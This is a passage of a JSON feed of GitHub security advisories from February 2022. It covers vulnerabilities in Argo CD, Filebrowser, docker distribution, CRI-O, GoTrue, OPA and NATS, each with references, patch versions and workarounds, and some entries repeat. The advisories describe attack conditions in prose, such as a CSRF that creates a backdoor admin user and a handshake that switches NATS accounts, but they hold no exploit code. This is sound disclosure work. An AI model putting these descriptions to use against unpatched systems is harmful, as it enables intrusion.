href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/78c2084f0febd159039ff785ddc2bd4ba1cecf88\">https://github.com/argoproj/argo-cd/commit/78c2084f0febd159039ff785ddc2bd4ba1cecf88</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.1.9\">https://github.com/argoproj/argo-cd/releases/tag/v2.1.9</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.2.4\">https://github.com/argoproj/argo-cd/releases/tag/v2.2.4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-24348\">https://nvd.nist.gov/vuln/detail/CVE-2022-24348</a></li>\n<li><a href=\"https://apiiro.com/blog/malicious-kubernetes-helm-charts-can-be-used-to-steal-sensitive-information-from-argo-cd-deployments/\">https://apiiro.com/blog/malicious-kubernetes-helm-charts-can-be-used-to-steal-sensitive-information-from-argo-cd-deployments/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-63qx-x74g-jcr7\">https://github.com/advisories/GHSA-63qx-x74g-jcr7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-63qx-x74g-jcr7",
            "title": "[github.com/argoproj/argo-cd] Path traversal and dereference of symlinks in Argo CD",
            "date_modified": "2022-02-11T22:52:24.000Z",
            "date_published": "2022-02-07T19:06:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-63qx-x74g-jcr7"
            }
        },
        {
            "content_html": "<p>A Cross-Site Request Forgery (CSRF) vulnerability exists in Filebrowser &lt; 2.18.0 that allows attackers to create a backdoor user with admin privilege and get access to the filesystem via a malicious HTML webpage that is sent to the victim.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-46398\">https://nvd.nist.gov/vuln/detail/CVE-2021-46398</a></li>\n<li><a href=\"https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d\">https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d</a></li>\n<li><a href=\"https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html\">https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html</a></li>\n<li><a href=\"https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/\">https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/</a></li>\n<li><a href=\"https://systemweakness.com/critical-csrf-to-rce-in-filebrowser-865a3c34b8e7\">https://systemweakness.com/critical-csrf-to-rce-in-filebrowser-865a3c34b8e7</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/165885/FileBrowser-2.17.2-Code-Execution-Cross-Site-Request-Forgery.html\">http://packetstormsecurity.com/files/165885/FileBrowser-2.17.2-Code-Execution-Cross-Site-Request-Forgery.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-72wf-hwcq-65h9\">https://github.com/advisories/GHSA-72wf-hwcq-65h9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-72wf-hwcq-65h9",
            "title": "[github.com/filebrowser/filebrowser] Cross-Site Request Forgery in Filebrowser",
            "date_modified": "2022-02-11T22:48:30.000Z",
            "date_published": "2022-02-05T00:00:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-72wf-hwcq-65h9"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Systems that rely on digest equivalence for image attestations may be vulnerable to type confusion.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to at least <code>v2.8.0-beta.1</code>  if you are running <code>v2.x</code> release. If you use the code from the <code>main</code> branch, update at least to the commit after <a href=\"https://github.com/distribution/distribution/commit/b59a6f827947f9e0e67df0cfb571046de4733586\">b59a6f827947f9e0e67df0cfb571046de4733586</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no way to work around this issue without patching.</p>\n<h3 id=\"references\">References</h3>\n<p>Due to <a href=\"https://github.com/opencontainers/image-spec/pull/411\">an oversight in the OCI Image Specification</a> that removed the embedded <code>mediaType</code> field from manifests, a maliciously crafted OCI Container Image can cause registry clients to parse the same image in two different ways without modifying the image’s digest by modifying the <code>Content-Type</code> header returned by a registry. This can invalidate a common pattern of relying on container image digests for equivalence.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/distribution/distribution\">distribution</a> </li>\n<li>Open an issue in <a href=\"https://github.com/opencontainers/distribution-spec\">distribution-spec</a> </li>\n<li>Email us at <a href=\"mailto:cncf-distribution-security@lists.cncf.io\">cncf-distribution-security@lists.cncf.io</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/distribution/distribution/security/advisories/GHSA-qq97-vm5h-rrhg\">https://github.com/distribution/distribution/security/advisories/GHSA-qq97-vm5h-rrhg</a></li>\n<li><a href=\"https://github.com/opencontainers/image-spec/pull/411\">https://github.com/opencontainers/image-spec/pull/411</a></li>\n<li><a href=\"https://github.com/distribution/distribution/commit/b59a6f827947f9e0e67df0cfb571046de4733586\">https://github.com/distribution/distribution/commit/b59a6f827947f9e0e67df0cfb571046de4733586</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qq97-vm5h-rrhg\">https://github.com/advisories/GHSA-qq97-vm5h-rrhg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qq97-vm5h-rrhg",
            "title": "[github.com/docker/distribution] OCI Manifest Type Confusion Issue",
            "date_modified": "2022-02-11T22:32:05.000Z",
            "date_published": "2022-02-08T18:53:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qq97-vm5h-rrhg"
            }
        },
        {
            "content_html": "<p>An incorrect sysctls validation vulnerability was found in CRI-O 1.18 and earlier. The sysctls from the list of \"safe\" sysctls specified for the cluster will be applied to the host if an attacker is able to create a pod with a hostIPC and hostNetwork kernel namespace.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0532\">https://nvd.nist.gov/vuln/detail/CVE-2022-0532</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2051730\">https://bugzilla.redhat.com/show_bug.cgi?id=2051730</a></li>\n<li><a href=\"https://kubernetes.io/docs/tasks/administer-cluster/sysctl-cluster/#enabling-unsafe-sysctls\">https://kubernetes.io/docs/tasks/administer-cluster/sysctl-cluster/#enabling-unsafe-sysctls</a></li>\n<li><a href=\"https://github.com/cri-o/cri-o/pull/5610\">https://github.com/cri-o/cri-o/pull/5610</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jqmc-79gx-7g8p\">https://github.com/advisories/GHSA-jqmc-79gx-7g8p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jqmc-79gx-7g8p",
            "title": "[github.com/cri-o/cri-o] Incorrect Permission Assignment for Critical Resource in CRI-O",
            "date_modified": "2022-02-11T21:48:21.000Z",
            "date_published": "2022-02-11T00:00:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jqmc-79gx-7g8p"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Under certain circumstances a valid user object would have been created with invalid provider metadata.</p>\n<p>This vulnerability affects everyone running an instance of GoTrue as a service. We advise you to update especially if you are using the provider metadata from the user object to secure other resources.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>A patch is available with the release of version <a href=\"https://github.com/netlify/gotrue/releases/tag/v1.0.1\">1.0.1 on Github</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>If you don't rely on the provider metadata in the user object, you might not be affected. We still strongly recommend upgrading.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>This problem was initially found and reported by the team at Supabase: <a href=\"https://github.com/supabase/gotrue/security/advisories/GHSA-5hvv-9cqv-894r\">https://github.com/supabase/gotrue/security/advisories/GHSA-5hvv-9cqv-894r</a>. We want to thank them for the cooperation around this report.</p>\n<p>In contrast to their advisory, we decided to set the severity to \"Moderate\" since the provider metadata is not an inherent security feature of this GoTrue codebase or the Netlify ecosystem.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:security@netlify.com\">security@netlify.com</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/netlify/gotrue/security/advisories/GHSA-wpfr-6297-9v57\">https://github.com/netlify/gotrue/security/advisories/GHSA-wpfr-6297-9v57</a></li>\n<li><a href=\"https://github.com/netlify/gotrue/pull/313\">https://github.com/netlify/gotrue/pull/313</a></li>\n<li><a href=\"https://github.com/netlify/gotrue/commit/4d8a3b39fe485a5f83c70617d594be01130c5b83\">https://github.com/netlify/gotrue/commit/4d8a3b39fe485a5f83c70617d594be01130c5b83</a></li>\n<li><a href=\"https://github.com/netlify/gotrue/releases/tag/v1.0.1\">https://github.com/netlify/gotrue/releases/tag/v1.0.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wpfr-6297-9v57\">https://github.com/advisories/GHSA-wpfr-6297-9v57</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wpfr-6297-9v57",
            "title": "[github.com/netlify/gotrue] User object created with invalid provider data in GoTrue",
            "date_modified": "2022-02-11T21:52:12.000Z",
            "date_published": "2022-02-09T22:29:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wpfr-6297-9v57"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Under certain conditions, pretty-printing an AST that contains synthetic nodes could change the logic of some statements by reordering array literals. Example of policies impacted are those that parse and compare web paths, see the example below.</p>\n<p><strong>All of these</strong> three conditions have to be met to create an adverse effect:</p>\n<ol>\n<li>An AST of Rego had to be <strong>created programmatically</strong> such that it ends up containing terms without a location (such as wildcard variables).</li>\n<li>The AST had to be <strong>pretty-printed</strong> using the <code>github.com/open-policy-agent/opa/format</code> package.</li>\n<li>The result of the pretty-printing had to be <strong>parsed and evaluated again</strong> via an OPA instance using the bundles, or the Golang packages.</li>\n</ol>\n<p>If any of these three conditions are not met, you are not affected.</p>\n<p>Notably, all three would be true if using <strong>optimized bundles</strong>, i.e. bundles created with <code>opa build -O=1</code> or higher.\nIn that case, the optimizer would fulfil condition (1.), the result of that would be pretty-printed when writing the bundle to disk, fulfilling (2.). When the bundle was then used, we'd satisfy (3.).</p>\n<h4 id=\"example\">Example</h4>\n<p>For example, the process outlined above could turn \nthis rule</p>\n<pre><code class=\"language-rego\">hello {\n    [\"foo\", _] = split(input.resource, \"/\")\n}\n</code></pre>\n<p>into</p>\n<pre><code class=\"language-rego\">hello {\n    [_, \"foo\"] = split(input.resource, \"/\")\n}\n</code></pre>\n<p>with an input of</p>\n<pre><code class=\"language-rego\">{\n    \"resource\": \"foo/bar\"\n}\n</code></pre>\n<p>the result would change from</p>\n<pre><code class=\"language-rego\">{\n    \"hello\": true\n}\n</code></pre>\n<p>to (no default value of hello)</p>\n<pre><code class=\"language-rego\">{}\n</code></pre>\n<p>The severity was determined to be <em>moderate</em> because the conditions are quite particular. Please note that its only the OPA bundle build process thats affected. An OPA sidecar of version 0.36.0 with an optimized bundle built by OPA 0.32.1 would not face this bug.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in version 0.37.0</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Disabling optimization when creating bundles.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Introduced in <a href=\"https://github.com/open-policy-agent/opa/pull/3851\">https://github.com/open-policy-agent/opa/pull/3851</a></li>\n<li>Backported for the 0.33.1 patch release: <a href=\"https://github.com/open-policy-agent/opa/commit/bfd984ddf93ef2c4963a08d4fdadae0bcf1a3717\">https://github.com/open-policy-agent/opa/commit/bfd984ddf93ef2c4963a08d4fdadae0bcf1a3717</a></li>\n<li>Fixed by <a href=\"https://github.com/open-policy-agent/opa/commit/932e4ffc37a590ace79e9b75ca4340288c220239\">https://github.com/open-policy-agent/opa/commit/932e4ffc37a590ace79e9b75ca4340288c220239</a> and <a href=\"https://github.com/open-policy-agent/opa/commit/2bd8edab9e10e2dc9cf76ae8335ced0c224f3055\">https://github.com/open-policy-agent/opa/commit/2bd8edab9e10e2dc9cf76ae8335ced0c224f3055</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/open-policy-agent/community/discussions/categories/opa-and-rego\">Community Discussions</a></li>\n<li>Ask in Slack: <a href=\"https://slack.openpolicyagent.org/\">https://slack.openpolicyagent.org/</a><h3 id=\"references-1\">References</h3>\n</li>\n</ul>\n<ul>\n<li><a href=\"https://github.com/open-policy-agent/opa/security/advisories/GHSA-hcw3-j74m-qc58\">https://github.com/open-policy-agent/opa/security/advisories/GHSA-hcw3-j74m-qc58</a></li>\n<li><a href=\"https://github.com/open-policy-agent/opa/pull/3851\">https://github.com/open-policy-agent/opa/pull/3851</a></li>\n<li><a href=\"https://github.com/open-policy-agent/opa/commit/932e4ffc37a590ace79e9b75ca4340288c220239\">https://github.com/open-policy-agent/opa/commit/932e4ffc37a590ace79e9b75ca4340288c220239</a></li>\n<li><a href=\"https://github.com/open-policy-agent/opa/commit/bfd984ddf93ef2c4963a08d4fdadae0bcf1a3717\">https://github.com/open-policy-agent/opa/commit/bfd984ddf93ef2c4963a08d4fdadae0bcf1a3717</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23628\">https://nvd.nist.gov/vuln/detail/CVE-2022-23628</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hcw3-j74m-qc58\">https://github.com/advisories/GHSA-hcw3-j74m-qc58</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hcw3-j74m-qc58",
            "title": "[github.com/open-policy-agent/opa] Array literal misordering in github.com/open-policy-agent/opa",
            "date_modified": "2022-02-11T21:53:06.000Z",
            "date_published": "2022-02-09T22:17:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hcw3-j74m-qc58"
            }
        },
        {
            "content_html": "<p>A Cross-Site Request Forgery (CSRF) vulnerability exists in Filebrowser &lt; 2.18.0 that allows attackers to create a backdoor user with admin privilege and get access to the filesystem via a malicious HTML webpage that is sent to the victim.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-46398\">https://nvd.nist.gov/vuln/detail/CVE-2021-46398</a></li>\n<li><a href=\"https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d\">https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d</a></li>\n<li><a href=\"https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html\">https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html</a></li>\n<li><a href=\"https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/\">https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/</a></li>\n<li><a href=\"https://systemweakness.com/critical-csrf-to-rce-in-filebrowser-865a3c34b8e7\">https://systemweakness.com/critical-csrf-to-rce-in-filebrowser-865a3c34b8e7</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/165885/FileBrowser-2.17.2-Code-Execution-Cross-Site-Request-Forgery.html\">http://packetstormsecurity.com/files/165885/FileBrowser-2.17.2-Code-Execution-Cross-Site-Request-Forgery.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-72wf-hwcq-65h9\">https://github.com/advisories/GHSA-72wf-hwcq-65h9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-72wf-hwcq-65h9",
            "title": "[github.com/filebrowser/filebrowser/v2] Cross-Site Request Forgery in Filebrowser",
            "date_modified": "2022-02-11T22:48:30.000Z",
            "date_published": "2022-02-05T00:00:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-72wf-hwcq-65h9"
            }
        },
        {
            "content_html": "<p>(This advisory is canonically <a href=\"https://advisories.nats.io/CVE/CVE-2022-24450.txt\">https://advisories.nats.io/CVE/CVE-2022-24450.txt</a>)</p>\n<h2 id=\"problem-description\">Problem Description</h2>\n<p>NATS nats-server through 2022-02-04 has Incorrect Access Control, with unchecked ability for clients to authorize into any account, because of a coding error in a long-extant experimental feature.</p>\n<p>A client crafting the initial protocol-level handshake could, with valid credentials for any account, specify a target account and switch into it immediately.  This includes any other tenant, and includes the System account which controls nats-server core operations.</p>\n<p>For deployments not using multi-tenancy through NATS Accounts, there is still a vulnerability: normal users are able to choose to be in the System account.</p>\n<p>An experimental feature to provide dynamically provisioned sandbox accounts was designed to allow a server administrator to turn on an option to allow clients to dynamically request a brand new account inline at connection time.  This feature went nowhere, but lived on in the code and was used by a number of tests; support was never added to any client libraries or to the documentation.</p>\n<p>A bug in handling the feature meant that if someone did in fact have valid account credentials, then they could specify any other existing account and they would be assigned into that account.</p>\n<p>Release 2.7.2 of nats-server removes the feature.\nBecause of the lack of client support and absence from protocol documentation, we feel this is safe operationally as well as the safest fix for the code.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<h4 id=\"nats-server\">NATS Server</h4>\n<ul>\n<li>All 2.x versions up to and including 2.7.1.</li>\n<li>Fixed with nats-io/nats-server: 2.7.2</li>\n<li>NATS Server 1.x did not have accounts.</li>\n<li>Docker image:  nats <a href=\"https://hub.docker.com/_/nats\">https://hub.docker.com/_/nats</a></li>\n</ul>\n<h4 id=\"nats-streaming-server\">NATS Streaming Server</h4>\n<ul>\n<li>All versions embedding affected NATS Server:<ul>\n<li>Affected: v0.15.0 up to and including v0.24.0</li>\n<li>Fixed with nats-io/nats-streaming-server: 0.24.1</li>\n</ul>\n</li>\n<li>Docker image:  nats-streaming <a href=\"https://hub.docker.com/_/nats-streaming\">https://hub.docker.com/_/nats-streaming</a></li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<p>Existing users could act in any account, including the System account.</p>\n<h2 id=\"workaround\">Workaround</h2>\n<p>None.</p>\n<h2 id=\"solution\">Solution</h2>\n<p>Upgrade the NATS server.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nats-io/nats-server/security/advisories/GHSA-g6w6-r76c-28j7\">https://github.com/nats-io/nats-server/security/advisories/GHSA-g6w6-r76c-28j7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-24450\">https://nvd.nist.gov/vuln/detail/CVE-2022-24450</a></li>\n<li><a href=\"https://advisories.nats.io/CVE/CVE-2022-24450.txt\">https://advisories.nats.io/CVE/CVE-2022-24450.txt</a></li>\n<li><a href=\"https://github.com/nats-io/nats-server/releases/tag/v2.7.2\">https://github.com/nats-io/nats-server/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g6w6-r76c-28j7\">https://github.com/advisories/GHSA-g6w6-r76c-28j7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g6w6-r76c-28j7",
            "title": "[github.com/nats-io/nats-streaming-server] Incorrect Authorization in NATS nats-server",
            "date_modified": "2022-02-11T22:41:11.000Z",
            "date_published": "2022-02-08T17:23:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g6w6-r76c-28j7"
            }
        },
        {
            "content_html": "<p>(This advisory is canonically <a href=\"https://advisories.nats.io/CVE/CVE-2022-24450.txt\">https://advisories.nats.io/CVE/CVE-2022-24450.txt</a>)</p>\n<h2 id=\"problem-description\">Problem Description</h2>\n<p>NATS nats-server through 2022-02-04 has Incorrect Access Control, with unchecked ability for clients to authorize into any account, because of a coding error in a long-extant experimental feature.</p>\n<p>A client crafting the initial protocol-level handshake could, with valid credentials for any account, specify a target account and switch into it immediately.  This includes any other tenant, and includes the System account which controls nats-server core operations.</p>\n<p>For deployments not using multi-tenancy through NATS Accounts, there is still a vulnerability: normal users are able to choose to be in the System account.</p>\n<p>An experimental feature to provide dynamically provisioned sandbox accounts was designed to allow a server administrator to turn on an option to allow clients to dynamically request a brand new account inline at connection time.  This feature went nowhere, but lived on in the code and was used by a number of tests; support was never added to any client libraries or to the documentation.</p>\n<p>A bug in handling the feature meant that if someone did in fact have valid account credentials, then they could specify any other existing account and they would be assigned into that account.</p>\n<p>Release 2.7.2 of nats-server removes the feature.\nBecause of the lack of client support and absence from protocol documentation, we feel this is safe operationally as well as the safest fix for the code.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<h4 id=\"nats-server\">NATS Server</h4>\n<ul>\n<li>All 2.x versions up to and including 2.7.1.</li>\n<li>Fixed with nats-io/nats-server: 2.7.2</li>\n<li>NATS Server 1.x did not have accounts.</li>\n<li>Docker image:  nats <a href=\"https://hub.docker.com/_/nats\">https://hub.docker.com/_/nats</a></li>\n</ul>\n<h4 id=\"nats-streaming-server\">NATS Streaming Server</h4>\n<ul>\n<li>All versions embedding affected NATS Server:<ul>\n<li>Affected: v0.15.0 up to and including v0.24.0</li>\n<li>Fixed with nats-io/nats-streaming-server: 0.24.1</li>\n</ul>\n</li>\n<li>Docker image:  nats-streaming <a href=\"https://hub.docker.com/_/nats-streaming\">https://hub.docker.com/_/nats-streaming</a></li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<p>Existing users could act in any account, including the System account.</p>\n<h2 id=\"workaround\">Workaround</h2>\n<p>None.</p>\n<h2 id=\"solution\">Solution</h2>\n<p>Upgrade the NATS server.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nats-io/nats-server/security/advisories/GHSA-g6w6-r76c-28j7\">https://github.com/nats-io/nats-server/security/advisories/GHSA-g6w6-r76c-28j7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-24450\">https://nvd.nist.gov/vuln/detail/CVE-2022-24450</a></li>\n<li><a href=\"https://advisories.nats.io/CVE/CVE-2022-24450.txt\">https://advisories.nats.io/CVE/CVE-2022-24450.txt</a></li>\n<li><a href=\"https://github.com/nats-io/nats-server/releases/tag/v2.7.2\">https://github.com/nats-io/nats-server/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g6w6-r76c-28j7\">https://github.com/advisories/GHSA-g6w6-r76c-28j7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g6w6-r76c-28j7",
            "title": "[github.com/nats-io/nats-server/v2] Incorrect Authorization in NATS nats-server",
            "date_modified": "2022-02-11T22:41:11.000Z",
            "date_published": "2022-02-08T17:23:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g6w6-r76c-28j7"
            }
        }
    ]
}